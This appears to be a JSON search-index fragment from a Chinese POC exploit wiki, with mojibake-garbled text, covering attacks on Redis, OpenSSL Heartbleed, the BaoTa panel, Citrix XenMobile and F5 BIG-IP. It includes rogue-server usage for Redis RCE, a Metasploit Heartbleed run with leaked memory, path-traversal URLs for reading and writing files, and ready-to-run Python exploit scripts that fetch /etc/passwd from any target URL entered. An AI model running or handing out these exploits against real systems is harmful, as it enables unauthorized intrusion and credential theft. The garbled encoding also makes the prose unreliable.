.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Redis/Redis å°äº5.0.5 ä¸»ä»å¤åˆ¶ RCE .html","title":"Redis <= 5.0.5 ä¸»ä»å¤åˆ¶ RCE ","keywords":"","body":"Redis æ¼æ´æè¿° åœ¨2019å¹´7æœˆ7æ—¥ç»“æŸçš„WCTF2019 Finalä¸Šï¼ŒLC/BCçš„æˆå‘˜Pavel Toporkovåœ¨åˆ†äº«ä¼šä¸Šä»‹ç»äº†ä¸€ç§å…³äºredisæ–°ç‰ˆæœ¬çš„RCEåˆ©ç”¨æ–¹å¼ï¼Œæ¯”èµ·ä»¥å‰çš„åˆ©ç”¨æ–¹å¼æ¥è¯´ï¼Œè¿™ç§åˆ©ç”¨æ–¹å¼æ›´ä¸ºé€šç”¨ï¼Œå±å®³ä¹Ÿæ›´å¤§ Pavel Toporkovçš„åˆ†äº« å½±å“ç‰ˆæœ¬ [!NOTE] Redis ç¯å¢ƒæ­å»º docker pull damonevking/redis5.0 docker run -p 6379:6379 -d damonevking/redis5.0 redis-server nmapæ‰«æä¸€ä¸‹6379ç«¯å£å¼€æ”¾å³ä¸ºæ­å»ºæˆåŠŸ root@kali:~/æ¡Œé¢# docker pull damonevking/redis5.0 Using default tag: latest latest: Pulling from damonevking/redis5.0 fc7181108d40: Pull complete 3e0ac67cad82: Pull complete 6ee495cb7235: Pull complete 9f7206d08b9d: Pull complete a8354ef8cccb: Pull complete 53afb10d81c2: Pull complete Digest: sha256:adcf62f378efe1187d2f72c6f0ecdf86ab2173a9e1c3c9f4fe4bb89060f5362f Status: Downloaded newer image for damonevking/redis5.0:latest docker.io/damonevking/redis5.0:latest root@kali:~/æ¡Œé¢# docker run -p 6379:6379 -d damonevking/redis5.0 redis-server 1275aa9c6c8f8ad0b6c8e58e609be6681acedec301b5593f7e8b0bd65f7fad12 root@kali:~/æ¡Œé¢# nmap 127.0.0.1 -p 6379 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-08 21:47 CST Nmap scan report for localhost (127.0.0.1) Host is up (0.000099s latency). PORT STATE SERVICE 6379/tcp open redis Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds æ¼æ´å¤ç° å…³äºæ¼æ´åŸç†è¯·æŸ¥çœ‹Pavel Toporkovçš„åˆ†äº« æ¼æ´åˆ©ç”¨è„šæœ¬: n0b0dyCN/redis-rogue-server âœ ./redis-rogue-server.py -h ______ _ _ ______ _____ | ___ \\ | (_) | ___ \\ / ___| | |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. ___ _ ____ _____ _ __ | // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ '__\\ \\ / / _ \\ '__| | |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ | \\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/ @copyright n0b0dy @ r3kapig Usage: redis-rogue-server.py [options] Options: -h, --help show this help message and exit --rhost=REMOTE_HOST target host --rport=REMOTE_PORT target redis port, default 6379 --lhost=LOCAL_HOST rogue server ip --lport=LOCAL_PORT rogue server listen port, default 21000 --exp=EXP_FILE Redis Module to load, default exp.so -v, --verbose Show full data stream Example python3 redis-rogue-server.py --rhost 192.168.51.146 --lhost 192.168.51.146 --exp=exp.so WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/OpenSSL/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/OpenSSL/","title":"OpenSSL","keywords":"","body":"OpenSSL OpenSSL å¿ƒè„æ»´è¡€æ¼æ´ CVE-2014-0160 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/OpenSSL/OpenSSL å¿ƒè„æ»´è¡€æ¼æ´ CVE-2014-0160.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/OpenSSL/OpenSSL å¿ƒè„æ»´è¡€æ¼æ´ CVE-2014-0160.html","title":"OpenSSL å¿ƒè„æ»´è¡€æ¼æ´ CVE-2014-0160","keywords":"","body":"OpenSSL å¿ƒè„æ»´è¡€æ¼æ´ CVE-2014-0160 æ¼æ´æè¿° 2014å¹´4æœˆ7æ—¥ï¼ŒOpenSSLå‘å¸ƒå®‰å…¨å…¬å‘Šï¼Œåœ¨OpenSSL1.0.1ç‰ˆæœ¬è‡³OpenSSL1.0.1f Beta1ç‰ˆæœ¬ä¸­å­˜åœ¨æ¼æ´ï¼Œè¯¥æ¼æ´ä¸­æ–‡åç§°ä¸ºå¿ƒè„æ»´è¡€ï¼Œè‹±æ–‡åç§°ä¸ºHeartBleedã€‚å…¶ä¸­Heartæ˜¯æŒ‡è¯¥æ¼æ´ä½äºå¿ƒè·³åè®®ä¸Šï¼ŒBleedæ˜¯å› ä¸ºè¯¥æ¼æ´ä¼šé€ æˆæ•°æ®æ³„éœ²ã€‚å³HeartBleedæ˜¯åœ¨å¿ƒè·³åè®®ä¸Šçš„ä¸€ä¸ªæ•°æ®æ³„éœ²æ¼æ´ï¼ŒOpenSSLåº“ä¸­ç”¨åˆ°äº†è¯¥å¿ƒè·³åè®®ã€‚HeartBleedä¸»è¦å­˜åœ¨ä¸OpenSSLçš„1.0.1ç‰ˆæœ¬åˆ°1.0.1fç‰ˆæœ¬ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] OpenSSL1.0.1ã€1.0.1aã€1.0.1bã€1.0.1cã€1.0.1dã€1.0.1eã€1.0.1fã€Beta 1 of OpenSSL 1.0.2ç­‰ç‰ˆæœ¬ ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/openssl/heartbleed docker-compose up -d æ¼æ´å¤ç° ä½¿ç”¨Nmapæ£€æµ‹è„šæœ¬å¯¹ç›®æ ‡è¿›è¡Œæ£€æµ‹ æ£€æµ‹åˆ°å¿ƒè„æ»´è¡€æ¼æ´ï¼Œä½¿ç”¨MSFå¯¹ç›®æ ‡è¿›è¡Œæ”»å‡» msf5 > use auxiliary/scanner/ssl/openssl_heartbleed msf5 auxiliary(scanner/ssl/openssl_heartbleed) > show options Module options (auxiliary/scanner/ssl/openssl_heartbleed): Name Current Setting Required Description ---- --------------- -------- ----------- DUMPFILTER no Pattern to filter leaked memory before storing LEAK_COUNT 1 yes Number of times to leak memory per SCAN or DUMP invocation MAX_KEYTRIES 50 yes Max tries to dump key RESPONSE_TIMEOUT 10 yes Number of seconds to wait for a server response RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 443 yes The target port (TCP) STATUS_EVERY 5 yes How many retries until key dump status THREADS 1 yes The number of concurrent threads (max one per host) TLS_CALLBACK None yes Protocol to use, \"None\" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES) TLS_VERSION 1.0 yes TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2) Auxiliary action: Name Description ---- ----------- SCAN Check hosts for vulnerability msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set rhost 192.168.51.133 rhost => 192.168.51.133 msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set verbose true verbose => true msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run [*] 192.168.51.133:443 - Leaking heartbeat response #1 [*] 192.168.51.133:443 - Sending Client Hello... [*] 192.168.51.133:443 - SSL record #1: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 86 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 82 [*] 192.168.51.133:443 - Type: Server Hello (2) [*] 192.168.51.133:443 - Server Hello Version: 0x0301 [*] 192.168.51.133:443 - Server Hello random data: 5fd46996727a4e50c0e2eaecf52d1592384aaa6870d4d65eea8b6b34eb47a389 [*] 192.168.51.133:443 - Server Hello Session ID length: 32 [*] 192.168.51.133:443 - Server Hello Session ID: 66e9cacbefcb28955de31c38bd9dff93de153a6d6247fa117ebc3f2f091d6f74 [*] 192.168.51.133:443 - SSL record #2: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 822 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 818 [*] 192.168.51.133:443 - Type: Certificate Data (11) [*] 192.168.51.133:443 - Certificates length: 815 [*] 192.168.51.133:443 - Data length: 818 [*] 192.168.51.133:443 - Certificate #1: [*] 192.168.51.133:443 - Certificate #1: Length: 812 [*] 192.168.51.133:443 - Certificate #1: #, issuer=#, serial=#, not_before=2020-08-09 17:03:46 UTC, not_after=2021-08-09 17:03:46 UTC> [*] 192.168.51.133:443 - SSL record #3: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 331 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 327 [*] 192.168.51.133:443 - Type: Server Key Exchange (12) [*] 192.168.51.133:443 - SSL record #4: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 4 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 0 [*] 192.168.51.133:443 - Type: Server Hello Done (14) [*] 192.168.51.133:443 - Sending Heartbeat... [*] 192.168.51.133:443 - Heartbeat response, 65535 bytes [+] 192.168.51.133:443 - Heartbeat response with leak, 65535 bytes [*] 192.168.51.133:443 - Printable info leaked: ......_...DV.\\....G...{.vc..i ..Gv.'....f.....\".!.9.8.........5.............................3.2.....E.D...../...A.......................................w.....#.'.g.@.r.v.........8.........2.....E.D.......Q.......P.=...ServiceInstanceW&V.b...?....|.y..................................................................................................................................... repeated 15479 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................QA......h.......h.........7.RV....7.RV..................................................................................................................................... repeated 4129 times .....................................................................................................................................0......X.......X.........................7.RV..............................RV..=.c.RV.. .7.RV..x.7.RV....7.RV....7.RV..x.7.RV..x.7.RV..h.7.RV....7.RV....7.RV..192.168.51.146 - - [12/Dec/2020:06:47:40 +0000] \"POST /sdk HTTP/1.1\" 404 170 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\".org/book/nse.html)\"..................................................................................................................................... repeated 3184 times .....................................................................................................................................Q ........................7.RV....7.RV..................................................................................................................................... repeated 7539 times .....................................................................................................................................@..........................................................................................................................................................................................................................................................................................................................................@.......................................................................................................................................................................................................$4.RV..................................@....... .......0.8.RV..........`.......0........$4.RV..jfx...&...~.RV..........PA......`....... '..RV..@d4.RV....................2.RV....................2.RV..........................1.................8.RV..........................1...............................................!...............h....... ...............m..U`.W.....O.>c.....E^X4........kr[..:.1...z[..x.W].........f...3h.qS.&K.(A*q*...].tx.b....X........Np....l.F...5....~..Z2.D..$........................................................................................................................................1.......x.......x.......P.2.RV....2.RV..0.......0.......>#NQ[.8.].......&.i2y.x.I....iOk........a....... '..RV..`.2.RV..................0.2.RV....................2.RV......................;P.e.........................U.6.&`.Ks..w>V.. ^..N..z....z...M.+..n/i..C...D......a..2.p.....I5.F......!.3Xhy.4.....r.....h.d..b........).......3.....&......IE...c,8.T.~..H.P.{y.....CK.,!&..;..vw....H.C...q....%e..{.XT.jq.R.r.....RHw..57.COlB..|......@...*.G(3..-N..P....mLO..]./.,9..|..+2.Lh..q..dF.m...'.....`...S.8........Q...U.0....I................................................................................................................................................................................................................................................................................ '..RV.. .8.RV..`.2.RV....................8.RV.................................. .2.RV....................2.RV............................................2.RV....................2.RV.......................... .2.RV.. .2.RV..................h.......h.........8.RV....8.RV..................................................................................................................................... repeated 745 times .....................................................................................................................................#8.RV..`.2.RV........!.3Xhy.4.....r.....h.d..b........).......3.....&......IE...c,8.T.~..H.P.{y.....CK.,!&..;..vw....H.C...q....%e..{.XT.jq.R.r.....RHw..57.COlB..|......@...*.G(3..-N..P....mLO..]./.,9..|..+2.Lh..q..dF.m...'.....`...S.8........Q...U.0....I ..................................................................................................................................... repeated 277 times .....................................................................................................................................X.......`.2.RV..........................................................P...........RV............................................................................................................................................................................................................................................................................................................................................2.RV..X..................................................................................................................................... repeated 437 times .....................................................................................................................................A.......X.........1.RV..................................................................................................................................................................................................................................................................................................................................X.......X..................................................................................................................................... repeated 429 times .....................................................................................................................................x.......!.......X.......X..................................................................................................................................... repeated 1942 times .....................................................................................................................................@..........V...R.._.i.rzNP.....-..8J.hp..^..k4.G.. f.....(.]..8......:mbG..~.?/..ot...................6...2../..,0..(0...........j..0...*.H........0V1.0...U....US1.0...U....Denial1.0...U....Springfield1.0...U....Dis1.0...U....localhost0...200809170346Z..210809170346Z0V1.0...U....US1.0...U....Denial1.0...U....Springfield1.0...U....Dis1.0...U....localhost0..\"0...*.H.............0.........8...;....../t.....^.....P..=....w.*b.a>.8.Q.?.$.c.......{G. ........l..i...D..V....0......B..J..Y.c.wO.....M.Df..R....\".4.u...............P.>.c..|.s(......,..H.1..0.=l`...(2..Sb.......`...c....5J....v..uj.*^i.$6^..a3.s.......v...\\....M.pK.9....t.&...|y...u1.......u..M..%.+..{e....G..~.v.D.6...............=).3{......r/.\"vz..a.U..5-.5.=......l..ud......Nx...n..$h...4.G.~b.LU.Y...37..e....%.w.......K...G...A....~m.h,......qz>}uA.^)..A.&}o@..'...y.]..V..S..JY........Y/.u|....$.n.T._.b\\\\c...o.]....L.h...v*....z..D..?Kq9hJ.kT....?.....=......su....p.S...j.e.....-N}.S...x..Z.....t.;Z...n=.1.......J.1n.l...w. .l.d.W. .........8..`.>O........t...r..~.A$..R...v.8......x.\\o WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/","title":"Webåº”ç”¨æ¼æ´","keywords":"","body":"Webåº”ç”¨æ¼æ´æ•´ç†ğŸ¦Œ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®å¡”è¿ç»´ç®¡ç†é¢æ¿/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®å¡”è¿ç»´ç®¡ç†é¢æ¿/","title":"å®å¡”è¿ç»´ç®¡ç†é¢æ¿","keywords":"","body":"å®å¡”è¿ç»´ç®¡ç†é¢æ¿ å®å¡” phpmyadmin æœªæˆæƒè®¿é—®æ¼æ´ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®å¡”è¿ç»´ç®¡ç†é¢æ¿/å®å¡” phpmyadminæœªæˆæƒè®¿é—®æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®å¡”è¿ç»´ç®¡ç†é¢æ¿/å®å¡” phpmyadminæœªæˆæƒè®¿é—®æ¼æ´.html","title":"å®å¡” phpmyadminæœªæˆæƒè®¿é—®æ¼æ´.md","keywords":"","body":"å®å¡” phpmyadminæœªæˆæƒè®¿é—®æ¼æ´ æ¼æ´æè¿° ã€å®å¡”é¢æ¿ã€‘ç´§æ€¥å®‰å…¨æ›´æ–°é€šçŸ¥ï¼ŒLinuxé¢æ¿7.4.2ç‰ˆæœ¬/Windowsé¢æ¿6.8ç‰ˆæœ¬å­˜åœ¨å®‰å…¨éšæ‚£ï¼Œå…¶ä»–ç‰ˆæœ¬æ— æ­¤é£é™©ã€‚å·²å‘å¸ƒç´§æ€¥æ›´æ–°ï¼Œè¯·æ‰€æœ‰ä½¿ç”¨æ­¤ç‰ˆæœ¬çš„ç”¨æˆ·åŠ¡å¿…å‡çº§åˆ°æœ€æ–°ç‰ˆï¼Œæ›´æ–°æ–¹æ³•ï¼Œç™»å½•é¢æ¿ç›´æ¥å‡çº§æ›´æ–°å³å¯ï¼Œå¦‚æ›´æ–°å‡ºç°é—®é¢˜ï¼Œè¯·ç™»å½•å®å¡”è®ºå›åé¦ˆæˆ–è€…è”ç³»å®¢æœåé¦ˆ å½±å“ç‰ˆæœ¬ [!NOTE] Linuxæ­£å¼ç‰ˆ7.4.2 Linuxæµ‹è¯•ç‰ˆ7.5.13 Windowsæ­£å¼ç‰ˆ6.8 æ¼æ´å¤ç° è®¿é—® http://xxx.xxx.xxx.xxx:888/pma å³å¯ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Citrix XenMobile/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Citrix XenMobile/","title":"Citrix XenMobile","keywords":"","body":"Citrix XenMobileä¼ä¸šç§»åŠ¨æ€§ç®¡ç†ç³»ç»Ÿ Citrix XenMobile ä»»æ„æ–‡ä»¶è¯»å– CVE-2020-8209 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Citrix XenMobile/Citrix XenMobile ä»»æ„æ–‡ä»¶è¯»å– CVE-2020-8209.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Citrix XenMobile/Citrix XenMobile ä»»æ„æ–‡ä»¶è¯»å– CVE-2020-8209.html","title":"Citrix XenMobile ä»»æ„æ–‡ä»¶è¯»å– CVE-2020-8209","keywords":"","body":"Citrix XenMobile ä»»æ„æ–‡ä»¶è¯»å– CVE-2020-8209 æ¼æ´æè¿° XenMobileæ˜¯Citrixå¼€å‘çš„ä¼ä¸šç§»åŠ¨æ€§ç®¡ç†è½¯ä»¶ã€‚è¯¥äº§å“å…è®¸ä¼ä¸šç®¡ç†å‘˜å·¥çš„ç§»åŠ¨è®¾å¤‡å’Œç§»åŠ¨åº”ç”¨ç¨‹åºã€‚è¯¥è½¯ä»¶çš„ç›®çš„æ˜¯é€šè¿‡å…è®¸å‘˜å·¥å®‰å…¨åœ°åœ¨ä¼ä¸šæ‹¥æœ‰çš„å’Œä¸ªäººç§»åŠ¨è®¾å¤‡åŠåº”ç”¨ç¨‹åºä¸Šå·¥ä½œæ¥æé«˜ç”Ÿäº§ç‡ã€‚ CVE-2020-8209ï¼Œè·¯å¾„éå†æ¼æ´ã€‚æ­¤æ¼æ´å…è®¸æœªç»æˆæƒçš„ç”¨æˆ·è¯»å–ä»»æ„æ–‡ä»¶ï¼ŒåŒ…æ‹¬åŒ…å«å¯†ç çš„é…ç½®æ–‡ä»¶ å½±å“ç‰ˆæœ¬ [!NOTE] RP2ä¹‹å‰çš„XenMobileæœåŠ¡å™¨10.12 RP4ä¹‹å‰çš„XenMobileæœåŠ¡å™¨10.11 RP6ä¹‹å‰çš„XenMobileæœåŠ¡å™¨10.1010.9 RP5ä¹‹å‰çš„XenMobileæœåŠ¡å™¨ FOFA [!NOTE] title=\"XenMobile\" æ¼æ´å¤ç° è®¿é—® http://xxx.xxx.xxx.xxx/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd å¯ä»¥æˆåŠŸä¸‹è½½/etc/passwdæ–‡ä»¶ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re import urllib3 def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Citrix XenMobile \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2020-8209.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] å«æœ‰CVE-2020-8209æ¼æ´ï¼ŒæˆåŠŸè¯»å–/etc/passwd\\033[0m\\n{} \".format(response.text)) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl > >> \\033[0m\")) POC_1(target_url) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/F5 BIG-IP/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/F5 BIG-IP/","title":"F5 BIG-IP","keywords":"","body":"F5 BIG-IP F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-5902 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/F5 BIG-IP/F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-5902.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/F5 BIG-IP/F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-5902.html","title":"F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-5902","keywords":"","body":"F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-5902 æ¼æ´æè¿° 2020å¹´07æœˆ03æ—¥ï¼Œ 360CERTç›‘æµ‹å‘ç° F5 å‘å¸ƒäº† F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œ çš„é£é™©é€šå‘Šï¼Œè¯¥æ¼æ´ç¼–å·ä¸º CVE-2020-5902ï¼Œæ¼æ´ç­‰çº§ï¼šä¸¥é‡ã€‚ æœªæˆæƒçš„è¿œç¨‹æ”»å‡»è€…é€šè¿‡å‘æ¼æ´é¡µé¢å‘é€ç‰¹åˆ¶çš„è¯·æ±‚åŒ…ï¼Œå¯ä»¥é€ æˆä»»æ„ Java ä»£ç æ‰§è¡Œã€‚è¿›è€Œæ§åˆ¶ F5 BIG-IP çš„å…¨éƒ¨åŠŸèƒ½ï¼ŒåŒ…æ‹¬ä½†ä¸é™äº: æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€å¼€å¯/ç¦ç”¨æœåŠ¡ã€åˆ›å»º/åˆ é™¤æœåŠ¡å™¨ç«¯æ–‡ä»¶ç­‰ã€‚è¯¥æ¼æ´å½±å“æ§åˆ¶é¢æ¿å—å½±å“ï¼Œä¸å½±å“æ•°æ®é¢æ¿ã€‚ æ¼æ´å½±å“ [!NOTE] F5 BIG-IP 15.x: 15.1.0.4 F5 BIG-IP 14.x: 14.1.2.6 F5 BIG-IP 13.x: 13.1.3.4 F5 BIG-IP 12.x: 12.1.5.2 F5 BIG-IP 11.x: 11.6.5.2 FOFA [!NOTE] title=\"BIG-IP&reg ;- Redirect\" æ¼æ´å¤ç° åœ¨ tmshCmd çš„ serviceæ–¹æ³•å¤„ç†è¯·æ±‚çš„æ—¶å€™ï¼Œæœªå¯¹command å‚æ•°è¿›è¡Œå¤„ç†ï¼Œç›´æ¥è°ƒç”¨ WorkspaceUtils.runTmshCommand(cmd, request); æ–¹æ³•æ‰§è¡Œå‘½ä»¤ï¼Œé™åˆ¶äº†æ‰§è¡Œdelete,create,list,modifyã€‚ if (\"POST\".equalsIgnoreCase(request.getMethod())) { String[] cmdArray = command.split(\" \"); String operation = cmdArray[0]; String module = cmdArray[2]; if (!ShellCommandValidator.checkForBadShellCharacters(command) && (operation.equals(\"create\") || operation.equals(\"delete\") || operation.equals(\"list\") || operation.equals(\"modify\")) && WHITELISTED_TMSH_MODULES.contains(module)) { try { String[] args = new String[]{command}; Result result = Syscall.callElevated(Syscall.TMSH, args); output = result.getOutput(); error = result.getError(); } catch (CallException var11) { logger.error(NLSEngine.getString(\"ilx.workspace.error.TmshCommandFailed\") + \": \" + var11.getMessage()); error = var11.getMessage(); } } else { error = NLSEngine.getString(\"ilx.workspace.error.RejectedTmshCommand\"); } åœ¨ fileRead çš„ serviceæ–¹æ³•å¤„ç†è¯·æ±‚çš„æ—¶å€™ï¼Œæœªå¯¹ fileName å‚æ•°è¿›è¡Œå¤„ç†ï¼Œç›´æ¥è°ƒç”¨ WorkspaceUtils.readFile(fileName); æ–¹æ³•ï¼Œè¿›è¡Œæ–‡ä»¶è¯»å–ã€‚ åœ¨ fileSave çš„ serviceæ–¹æ³•å¤„ç†è¯·æ±‚çš„æ—¶å€™ï¼Œæœªå¯¹ fileNameï¼Œcontent å‚æ•°è¿›è¡Œå¤„ç†ï¼Œç›´æ¥è°ƒç”¨ WorkspaceUtils.saveFile(request); æ–¹æ³•ï¼Œè¿›è¡Œæ–‡ä»¶ä¸Šä¼ ã€‚ è¯¦æƒ…åˆ©ç”¨æ–¹å¼ https://github.com/jas502n/CVE-2020-5902 è¯¦æƒ…åˆ©ç”¨æ–¹å¼ https://github.com/wx3514/CVE-2020-5902/blob/master/CVE-2020-5902.md è¯»å–æ–‡ä»¶ http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd å†™å…¥æ–‡ä»¶ http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp POST: fileName=/tmp/PeiQi.txt&content=PceiQi è¯»å–æ–‡ä»¶ /tmp/PeiQi æˆåŠŸå†™å…¥æ–‡ä»¶ æ¼æ´åˆ©ç”¨POC import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: F5 BIG-IP \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2020-5902.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Language\":\"zh-CN,zh;q=0.9\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=version_url, timeout=10, verify=False, headers=headers) if \"output\" in response.text: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸º:\\n{}\\033[0m\".format(target_url, json.loads(response.text)[\"output\"])) else: print(\"\\033[31m[x] ç›®æ ‡æ¼æ´æ— æ³•åˆ©ç”¨ \\033[0m\") except Exception as e: print(\"\\033[31m[x] ç›®æ ‡æ¼æ´æ— æ³•åˆ©ç”¨ ,{}\\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) å‚è€ƒæ–‡ç«  https://mochazz.github.io/2020/07/11/F5-BIG-IP%E6%9C%AA%E6%8E%88%E6%9D%83RCE(CVE-2020-5902)/#%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Lanproxy/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Lanproxy/","title":"Lanproxy","keywords":"","body":"Lanproxy Lanproxy ç›®å½•éå†æ¼æ´ CVE-2021-3019 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Lanproxy/Lanproxy ç›®å½•éå†æ¼æ´ CVE-2021-3019.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Lanproxy/Lanproxy ç›®å½•éå†æ¼æ´ CVE-2021-3019.html","title":"Lanproxy ç›®å½•éå†æ¼æ´ 